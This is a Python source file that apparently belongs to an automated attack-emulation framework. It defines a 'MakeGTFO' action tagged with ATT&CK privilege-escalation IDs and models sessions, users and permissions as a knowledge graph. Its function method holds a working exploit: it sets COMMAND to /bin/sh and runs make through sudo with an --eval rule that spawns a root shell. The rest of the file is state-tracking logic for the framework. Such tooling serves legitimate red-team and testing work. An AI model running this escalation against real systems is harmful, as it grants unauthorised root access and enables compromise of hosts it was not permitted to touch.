from typing import Union

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import run_command
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, MultiPattern, Pattern, Relationship
from kg_api.query import Query
from Session import SessionManager
from motifs import ActionInputMotif, ActionOutputMotif, StateChangeOperation


class MakeGTFO(Action):
    """
    Run make command as root.
    """

    def __init__(self):
        super().__init__("MakeGTFO", "T1548", "TA0004", ["quiet", "fast"])
        self.noise = 0.5
        self.impact = 0.8
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for MakeGTFO.
        """
        input_motif = ActionInputMotif(
            name="InputMotif_MakeGTFO", description="Input motif for MakeGTFO"
        )

        input_motif.add_template(
            template_name="existing_service",
            entity=Entity("Service", alias="service"),
        )

        input_motif.add_template(
            template_name="existing_session",
            entity=Entity("Session", alias="session"),
            relationship_type="executes_on",
            match_on="existing_service",
        )

        input_motif.add_template(
            template_name="existing_user",
            entity=Entity("User", alias="user"),
            relationship_type="is_client",
            match_on="existing_service",
        )

        input_motif.add_template(
            template_name="existing_permission",
            entity=Entity("Permission", alias="permission", command="/usr/bin/make"),
            relationship_type="has",
            match_on="existing_user",
            invert_relationship=True,
        )
        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif for MakeGTFO.
        """
        output_motif = ActionOutputMotif(
            name="OutputMotif_MakeGTFO", description="Output motif for MakeGTFO"
        )

        output_motif.add_template(
            template_name="updated_session",
            entity=Entity("Session", alias="session"),
            operation=StateChangeOperation.UPDATE,
            expected_attributes=["active"],
        )

        output_motif.add_template(
            template_name="discovered_session",
            entity=Entity(
                "Session",
                alias="root_session",
                protocol="root",
                username="root",
                active=True,
            ),
            relationship_type="executes_on",
            match_on=Entity("Service", alias="service"),
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return expected outcome of action.
        """
        user = pattern.get("user").get("username")
        session = pattern.get("session")._id
        permission = pattern.get("permission")._id
        return [
            f"Change user to {user} in session ({session}) with permission ({permission})"
        ]

    def get_target_query(self) -> Query:
        """
        get_target_patterns check to identify a user with permission to run the make
        command as root.
        """
        query = self.input_motif.get_query()
        query.where(
            self.input_motif.get_template("existing_user").entity.username
            == self.input_motif.get_template("existing_session").entity.username
        )
        query.ret_all()
        return query

    def function(
        self,
        sessions: SessionManager,
        artefacts: ArtefactManager,
        pattern: MultiPattern,
    ) -> ActionExecutionResult:
        """
        Exploit make command to change user.
        """
        tulpa_session = pattern.get("session")
        tulpa_session_id = tulpa_session.get("id")
        live_session = sessions.get_session(tulpa_session_id)
        permission = pattern.get("permission")
        as_user = permission.get("as_user")

        live_session.run_command("COMMAND='/bin/sh'")
        cmd = rf"sudo -u {as_user} make -s --eval=$'x:\n\t-'" + r'"$COMMAND"'
        output = live_session.run_command(cmd)
        return ActionExecutionResult(
            command=[cmd],
            stdout=output,
            session=tulpa_session_id,
            logs=["Environment variable COMMAND='/bin/sh'"],
        )

    def parse_output(
        self, output: ActionExecutionResult, artefacts: ArtefactManager
    ) -> dict:
        """
        Parse the output of the MakeGTFO action.
        """
        return {
            "old_session_active": False,
            "root_session_active": True,
        }

    def populate_output_motif(
        self, pattern: Pattern, discovered_data: dict
    ) -> StateChangeSequence:
        """
        Populate the output motif for MakeGTFO.

        This method:
        1. Updates the old session to set active=False
        2. Creates a new root session linked to both:
           - The service via executes_on relationship (root_session -[executes_on]-> service)
           - The old session via spawned relationship (old_session -[spawned]-> root_session)

        The final pattern should be: old_session -[spawned]-> root_session -[executes_on]-> service
        """
        self.output_motif.reset_context()
        changes: StateChangeSequence = []

        old_session = pattern.get("session")
        service = pattern.get("service")

        updated_session_change = self.output_motif.instantiate(
            template_name="updated_session",
            match_on_override=old_session,
            active=discovered_data["old_session_active"],
        )
        changes.append(updated_session_change)

        # Get the updated session entity from the pattern
        updated_session_pattern = updated_session_change[-1]
        if isinstance(updated_session_pattern, Pattern):
            updated_session_entity = updated_session_pattern.get("session")
        else:
            updated_session_entity = updated_session_pattern

        # Build match pattern for the root session that includes full context
        # This matches the structure from the commented code: pattern[0] & update_session - Relationship('executes_on') - service & pattern[2] & pattern[3]
        if isinstance(pattern, MultiPattern):
            match_pattern = (
                pattern[0]
                & updated_session_entity - Relationship("executes_on") - service
                & pattern[2]
                & pattern[3]
            )
        else:
            # If pattern is not a MultiPattern, create one with the necessary components
            match_pattern = (
                pattern.get("service")
                & updated_session_entity - Relationship("executes_on") - service
                & pattern.get("user")
                & pattern.get("permission")
            )

        root_session = self.output_motif.instantiate(
            template_name="discovered_session",
            match_on_override=service,
            full_pattern_override=match_pattern,
            additional_relationships=[
                (
                    "spawned",
                    updated_session_entity,
                    True,
                ),  # old_session -[spawned]-> root_session
            ],
            active=discovered_data["root_session_active"],
        )
        changes.append(root_session)

        return changes

    def capture_state_change(
        self,
        artefacts: ArtefactManager,
        pattern: Pattern,
        output: ActionExecutionResult,
    ) -> StateChangeSequence:
        discovered_data = self.parse_output(output, artefacts)
        changes = self.populate_output_motif(pattern, discovered_data)
        return changes
